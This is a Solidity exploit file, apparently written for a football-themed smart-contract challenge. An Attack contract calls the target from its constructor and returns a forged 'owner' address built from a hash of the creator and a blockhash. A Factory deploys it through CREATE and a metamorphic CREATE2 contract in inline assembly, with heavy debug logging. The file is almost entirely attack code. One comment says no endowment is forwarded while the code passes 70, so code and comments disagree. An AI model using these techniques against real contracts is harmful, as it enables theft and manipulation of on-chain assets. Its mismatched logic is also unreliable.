pragma solidity ^0.8.7;
import "hardhat/console.sol";
interface ITarget {
    function passTheBall() external ;
    function shoot() external;
}

contract Attack {
    address private immutable owner_attack;
    address internal player;
    uint256 public goals = 1;
    uint256 public  blocknumber;
    address public target_creator;
  
    function attack(address target, uint256 _blocknumber) public {
        blocknumber=_blocknumber;
        ITarget(target).shoot();
    }
    function handOfGod() public returns(uint256) {
        goals = 2;
        return 22061986;
    }
    function getBallPossesion() external view returns (address){
        address output = owner_attack;
        return output;
        }
    constructor(address target, address _target_creator) {        
        target_creator=_target_creator;
        address _owner_attack= address(uint160(uint256(keccak256(abi.encodePacked(_target_creator, blockhash(block.number))))));
        owner_attack=_owner_attack;
        ITarget(target).passTheBall(); 
        
    }
}

contract Factory {


    mapping (address => address) _implementations;

    event Deployed(address _addr);

    function deploy(uint salt, bytes calldata bytecode,address target,address _target_creator) public {
    console.log("attack - Factory > point 000");
        //bytes memory implInitCode = bytecode;
    console.log("attack - Factory > point 400");
          // assign the initialization code for the metamorphic contract.
          bytes memory metamorphicCode=type(Attack).creationCode;
        //bytes memory metamorphicCode  = (
         // hex"5860208158601c335a63aaf10f428752fa158151803b80938091923cf3"
        //);
    console.log("attack - Factory > point 500");
         // determine the address of the metamorphic contract.
        address metamorphicContractAddress = _getMetamorphicContractAddress(salt, metamorphicCode);
        console.log("attack - Factory > metamorphicContractAddress: %s",metamorphicContractAddress);
    console.log("attack - Factory > point 600");
        // declare a variable for the address of the implementation contract.
        address implementationContract;

          bytes memory implInitCode=abi.encodePacked(bytecode, abi.encode(target, _target_creator));
          console.log( uint256 ( bytes32(implInitCode)));
         //load implementation init code and length, then deploy via CREATE.
        /* solhint-disable no-inline-assembly */
        assembly {
          let encoded_data := add(0x20, implInitCode)  //load initialization code.
          let encoded_size := mload(implInitCode)      //load init code's length.
          implementationContract := create(        //call CREATE with 3 arguments.
            70,                                     //do not forward any endowment.
            encoded_data,                          //pass in initialization code.
            encoded_size                           //pass in init code's length.
          )
        } /* solhint-enable no-inline-assembly */

        //first we deploy the code we want to deploy on a separate address
        // store the implementation to be retrieved by the metamorphic contract.

console.log("attack - deploy > implementationContract ",implementationContract);
    console.log("attack - Factory > point 695");
        _implementations[metamorphicContractAddress] = implementationContract;
    console.log("attack - Factory > point 700");
        address  addr;
            console.log("attack - Factory > point 800");
        assembly {
            let encoded_data := add(0x20, metamorphicCode) // load initialization code.
            let encoded_size := mload(metamorphicCode)     // load init code's length.
            addr := create2(0, encoded_data, encoded_size, salt)
        }
        console.log("attack - deploy > address create2: ",addr);
        
         require(
          addr == metamorphicContractAddress,
          "Failed to deploy the new metamorphic contract."
        );

            console.log("attack - Factory > point 2000");
        emit Deployed(addr);
    }

    /**
    * @dev Internal view function for calculating a metamorphic contract address
    * given a particular salt.
    */
    function _getMetamorphicContractAddress(
        uint256 salt,
        bytes memory metamorphicCode
        ) internal view returns (address) {

        // determine the address of the metamorphic contract.
        return address(
          uint160(                      // downcast to match the address type.
            uint256(                    // convert to uint to truncate upper digits.
              keccak256(                // compute the CREATE2 hash using 4 inputs.
                abi.encodePacked(       // pack all inputs to the hash together.
                  hex"ff",              // start with 0xff to distinguish from RLP.
                  address(this),        // this contract will be the caller.
                  salt,                 // pass in the supplied salt value.
                  keccak256(
                      abi.encodePacked(
                        metamorphicCode
                      )
                    )     // the init code hash.
                )
              )
            )
          )
        );
    }
}




